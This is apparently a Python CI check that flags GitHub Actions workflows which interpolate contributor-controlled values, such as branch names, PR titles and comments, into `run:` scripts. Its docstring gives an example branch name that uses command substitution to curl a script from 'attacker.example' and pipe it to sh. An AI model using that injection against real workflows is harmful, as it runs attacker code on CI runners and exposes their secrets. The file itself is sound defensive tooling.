#!/usr/bin/env python3
"""
Refuse a workflow that drops an outsider-controlled value into a `run:` script.

WHY THIS IS ITS OWN CHECK
-------------------------
A `${{ }}` expression is not a variable. GitHub substitutes it into the script TEXT before bash
parses it, so a value containing `$( )` or a backtick is executed. Double quotes do not help --
command substitution happens inside them. `git check-ref-format` forbids space, `~`, `^`, `:`, `?`,
`*`, `[` and backslash in a refname but permits `$`, `(`, `)`, `;` and a backtick, so a branch named

    x$(curl -sfL attacker.example/p | sh)

is a legal branch whose contents run on the runner of any workflow that interpolates its name.

Nothing in this repository could see that. `shell-lint` runs `bash -n` over `scripts/` and `tests/`
and `shellcheck` over `scripts/**/*.sh`; embedded workflow bash is not parsed by either, so the one
live instance of this -- in the workflow that DISPATCHES RELEASES -- sat there unremarked.

THE FIX THIS ENFORCES: pass the value through `env:`. An environment variable is expanded by bash at
runtime as data and is never reparsed as script. That is what makes it safe; quoting is not.

    env:
      HEAD_REF: ${{ github.event.pull_request.head.ref }}
    run: |
      gh workflow run release.yml --ref "${HEAD_REF}"

A DENY LIST, NOT AN ALLOW LIST, and deliberately so. Most `${{ }}` in a run: block is a maintainer's
own value and flagging all of it would produce noise that gets suppressed, which is worse than no
check. What is listed here is the set an OUTSIDE CONTRIBUTOR can choose: branch names, PR titles and
bodies, issue and comment text, commit messages. Add to it rather than widening it to everything.

Exit 1 on any finding. Exit 0 only when every workflow keeps these values out of its scripts.
"""
from __future__ import annotations

import re
import sys
from pathlib import Path

# Contexts an outside contributor controls the value of.
OUTSIDER_CONTROLLED = [
    r"github\.head_ref",
    r"github\.event\.pull_request\.head\.ref",
    r"github\.event\.pull_request\.head\.label",
    r"github\.event\.pull_request\.head\.repo\.[A-Za-z_.]+",
    r"github\.event\.pull_request\.title",
    r"github\.event\.pull_request\.body",
    r"github\.event\.issue\.title",
    r"github\.event\.issue\.body",
    r"github\.event\.comment\.body",
    r"github\.event\.discussion\.title",
    r"github\.event\.discussion\.body",
    r"github\.event\.head_commit\.message",
    r"github\.event\.head_commit\.author\.(name|email)",
    r"github\.event\.commits\[[0-9]+\]\.message",
    r"github\.event\.workflow_run\.head_branch",
]

RISKY = re.compile(r"\$\{\{\s*(" + "|".join(OUTSIDER_CONTROLLED) + r")\s*\}\}")
RUN_KEY = re.compile(r"^(\s*)(?:-\s+)?run:\s*(\|[-+]?|>[-+]?)?\s*(\S.*)?$")


def findings_in(path: Path) -> list[tuple[int, str, str]]:
    """Return (line_number, expression, line_text) for each risky interpolation inside a run: block."""
    out: list[tuple[int, str, str]] = []
    lines = path.read_text(encoding="utf-8", errors="replace").split("\n")

    in_run = False
    run_indent = 0
    for number, line in enumerate(lines, start=1):
        match = RUN_KEY.match(line)
        if match:
            # `run: something-on-one-line` is still a script; check it, then leave block mode off
            # unless this opened a block scalar.
            inline = match.group(3)
            if inline:
                for hit in RISKY.finditer(inline):
                    out.append((number, hit.group(1), line.strip()))
            in_run = bool(match.group(2))
            run_indent = len(match.group(1))
            continue

        if in_run:
            stripped = line.strip()
            indent = len(line) - len(line.lstrip())
            # A block scalar ends at the first non-blank line indented no further than its key.
            if stripped and indent <= run_indent:
                in_run = False
            else:
                for hit in RISKY.finditer(line):
                    out.append((number, hit.group(1), stripped))

    return out


def main(argv: list[str]) -> int:
    root = Path(argv[1]).resolve() if len(argv) > 1 else Path(__file__).resolve().parents[2]
    workflow_dir = root / ".github" / "workflows"

    if not workflow_dir.is_dir():
        print(f"workflow-interpolation: ERROR: {workflow_dir} does not exist", file=sys.stderr)
        return 1

    files = sorted(workflow_dir.glob("*.yml")) + sorted(workflow_dir.glob("*.yaml"))
    if not files:
        # A scan that matches nothing is the failure this whole class of check exists to avoid.
        print(
            "workflow-interpolation: ERROR: no workflow files found, so this check proved nothing",
            file=sys.stderr,
        )
        return 1

    total = 0
    for path in files:
        for number, expression, text in findings_in(path):
            rel = path.relative_to(root).as_posix()
            print(
                f"workflow-interpolation: ERROR: {rel}:{number} interpolates {expression}, a value "
                f"an outside contributor chooses, into a run: script.\n"
                f"         {text}\n"
                f"       GitHub substitutes this into the script TEXT before bash parses it, so a "
                f"value containing $( ) or a backtick executes; quoting does not prevent that.\n"
                f"       Pass it through env: instead, and reference it as a shell variable:\n"
                f"         env:\n"
                f"           SOME_NAME: ${{{{ {expression} }}}}\n"
                f'         run: |\n'
                f'           ... "${{SOME_NAME}}" ...',
                file=sys.stderr,
            )
            total += 1

    if total:
        print(f"workflow-interpolation: {total} finding(s)", file=sys.stderr)
        return 1

    print(f"workflow-interpolation: clean ({len(files)} workflows scanned)")
    return 0


if __name__ == "__main__":
    sys.exit(main(sys.argv))
